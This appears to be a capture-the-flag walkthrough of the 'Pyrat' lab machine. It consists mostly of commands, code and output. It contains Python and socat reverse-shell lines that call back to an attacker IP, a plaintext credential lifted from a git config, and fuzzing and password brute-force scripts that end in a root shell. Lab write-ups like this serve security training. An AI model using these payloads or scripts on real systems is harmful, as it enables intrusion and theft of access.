@@ -1,0 +1,265 @@
+## Connect back shell
+```
+$ nc pyrat.thm 8000
+print('hello')
+hello
+
+import socket,subprocess,os;s=socket.socket();s.connect(("10.14.28.97",5544));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])
+```
+
+## Shell popped on 5544
+```
+$ nc -nlvp 5544 -s 10.14.28.97
+Listening on 10.14.28.97 5544
+Connection received on 10.10.65.166 59348
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+..snipped..
+echo $SHELL
+/bin/sh
+..snipped..
+/tmp
+uname -a
+Linux Pyrat 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+## Stabilise shell via socat
+```
+chmod +x ./socat
+ls -Flah
+total 416K
+drwxrwxrwt 12 root     root     4.0K Apr 12 15:45 ./
+drwxr-xr-x 18 root     root     4.0K Dec 22  2023 ../
+..snipped..
+-rwxr-xr-x  1 www-data www-data 367K Apr 12 15:45 socat*
+..snipped..
+./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.14.28.97:4321
+```
+
+-- Listener --
+```
+$ ./socat file:`tty`,raw,echo=0 tcp-listen:4321
+bash: /root/.bash_profile: Permission denied
+www-data@Pyrat:/tmp$ 
+..snipped..
+www-data@Pyrat:/tmp$ history
+    1  export TERM='xterm';stty rows 83 cols 183;alias lsf='ls -Flah';alias cls='clear'
+    2  history
+```
+
+## Mail from root
+```
+www-data@Pyrat:/var/spool/mail$ lsf
+total 12K
+drwxrwsr-x  2 root mail 4.0K Jun 21  2023 ./
+drwxr-xr-x 12 root root 4.0K Dec 22  2023 ../
+lrwxrwxrwx  1 root mail    9 Jun 21  2023 root -> /dev/null
+-r--r--r--  1 root mail  617 Jun 21  2023 think
+lrwxrwxrwx  1 root mail    9 Jun 21  2023 www-data -> /dev/null
+www-data@Pyrat:/var/spool/mail$ cat think 
+From root@pyrat  Thu Jun 15 09:08:55 2023
+Return-Path: <root@pyrat>
+X-Original-To: think@pyrat
+Delivered-To: think@pyrat
+Received: by pyrat.localdomain (Postfix, from userid 0)
+        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+Subject: Hello
+To: <think@pyrat>
+X-Mailer: mail (GNU Mailutils 3.7)
+Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
+Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+From: Dbile Admen <root@pyrat>
+
+Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
+```
+
+## Files by think
+```
+www-data@Pyrat:/home$ find / -type f -user think 2> /dev/null|xargs ls -Flah
+-rw-rw-r-- 1 think think   21 Jun 21  2023 /opt/dev/.git/COMMIT_EDITMSG
+-rw-rw-r-- 1 think think  296 Jun 21  2023 /opt/dev/.git/config
+..snipped..
+```
+
+## Juicy details
+```
+www-data@Pyrat:/opt/dev/.git$ cat config 
+..snipped..
+[credential "https://github.com"]
+        username = think
+        password = _TH1NKINGPirate$_
+```
+
+## Able to ssh as think
+```
+$ ssh think@pyrat.thm      
+The authenticity of host 'pyrat.thm (10.10.65.166)' can't be established.
+ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'pyrat.thm' (ED25519) to the list of known hosts.
+think@pyrat.thm's password: 
+..snipped..
+Last login: Thu Jun 15 12:09:31 2023 from 192.168.204.1
+think@Pyrat:~$
+```
+
+## Git restore file
+```
+think@Pyrat:/opt/dev$ git reset --hard HEAD
+HEAD is now at 0a3c36d Added shell endpoint
+think@Pyrat:/opt/dev$ cat  pyrat.py.old 
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................
+```
+
+## Fuzz endpoint
+```
+think@Pyrat:~$ cat fuzz.py 
+#!/usr/bin/env python3
+import socket
+
+HOST = '127.0.0.1'
+PORT = 8000
+
+# Sample wordlist — extend or load from file
+fuzz_words = [
+    'shell', 'some_endpoint', 'admin', 'root', 'debug', 'exec',
+    'status', 'health', 'get_shell', 'drop_priv', 'check_uid',
+    'env', 'flag', 'upload', 'download', 'run', 'start',
+    'test', 'foo', 'bar', 'cmd', 'command', 'do_shell', 'backup'
+]
+
+def send_fuzz_payload(word):
+    try:
+        with socket.create_connection((HOST, PORT), timeout=3) as s:
+            s.sendall(word.encode() + b'\n')
+            response = s.recv(4096)
+            print(f"[+] Sent: {word:<15} | Response: {response.decode(errors='ignore').strip()}")
+    except Exception as e:
+        print(f"[-] {word:<15} | Error: {e}")
+
+for word in fuzz_words:
+    send_fuzz_payload(word)
+```
+
+## Endpoint - admin
+```
+think@Pyrat:~$ ./fuzz.py 
+[+] Sent: shell           | Response: $
+[+] Sent: some_endpoint   | Response: name 'some_endpoint' is not defined
+[+] Sent: admin           | Response: Password:
+```
+
+
+## Brute force admin
+--brute.py--
+```
+#!/usr/bin/env python3
+import socket
+import argparse
+
+def load_passwords(path):
+    try:
+        with open(path, 'r') as f:
+            return [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        print(f"[-] Failed to read password file: {e}")
+        exit(1)
+
+def try_passwords(passwords):
+    for pwd in passwords:
+        try:
+            s = socket.create_connection((HOST, PORT), timeout=2)
+            s.sendall(b"admin\n")
+            response = s.recv(1024)
+            
+            if b"Password" in response:
+                s.sendall((pwd + "\n").encode())
+                res = s.recv(1024)
+                reply = res.decode(errors='ignore').strip()
+
+                # Check for failed login (server prompts for Password: again)
+                if reply == "Password:":
+                    print(f"[-] Tried: {pwd:<15} | Response: RETRIED — wrong password")
+                else:
+                    print(f"[+] Tried: {pwd:<15} | Response: {reply}")
+                    break  # stop after success
+            s.close()
+        except Exception as e:
+            print(f"[-] Error: {e}")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Brute-force admin password")
+    parser.add_argument('--password-file', required=True, help='Path to password list')
+    parser.add_argument('--host', default='127.0.0.1')
+    parser.add_argument('--port', type=int, default=8000)
+    args = parser.parse_args()
+
+    HOST = args.host
+    PORT = args.port
+    password_list = load_passwords(args.password_file)
+    try_passwords(password_list)
+```
+
+```
+think@Pyrat:~$ ./brute.py --host localhost --port 8000 --password-file ./xato-net-10-million-passwords-1000.txt |tee results.out
+[-] Tried: 123456          | Response: RETRIED — wrong password
+..snipped..
+[+] Tried: abc123          | Response: Welcome Admin!!! Type "shell" to begin
+```
+
+## Escalate to root
+```
+think@Pyrat:~$ nc localhost 8000
+admin
+Password:
+abc123
+Welcome Admin!!! Type "shell" to begin
+shell
+# cd /root
+cd /root
+# ls -Flah
+ls -Flah
+total 68K
+drwxrwx---  7 root root 4.0K Apr 15  2024 ./
+drwxr-xr-x 18 root root 4.0K Dec 22  2023 ../
+lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
+-rwxrwx---  1 root root 3.2K Jun 21  2023 .bashrc*
+drwx------  2 root root 4.0K Jun 21  2023 .cache/
+drwx------  3 root root 4.0K Dec 22  2023 .config/
+-rw-r--r--  1 root root   29 Jun 21  2023 .gitconfig
+drwxr-xr-x  3 root root 4.0K Jan  4  2024 .local/
+-rwxrwx---  1 root root  161 Dec  5  2019 .profile*
+-rwxr-xr-x  1 root root 5.3K Apr 15  2024 pyrat.py*
+-rw-r-----  1 root root   33 Jun 15  2023 root.txt
+-rw-r--r--  1 root root   75 Jun 15  2023 .selected_editor
+drwxrwx---  3 root root 4.0K Jun  2  2023 snap/
+drwxrwx---  2 root root 4.0K Jun  2  2023 .ssh/
+-rw-rw-rw-  1 root root  11K Apr 15  2024 .viminfo
+```
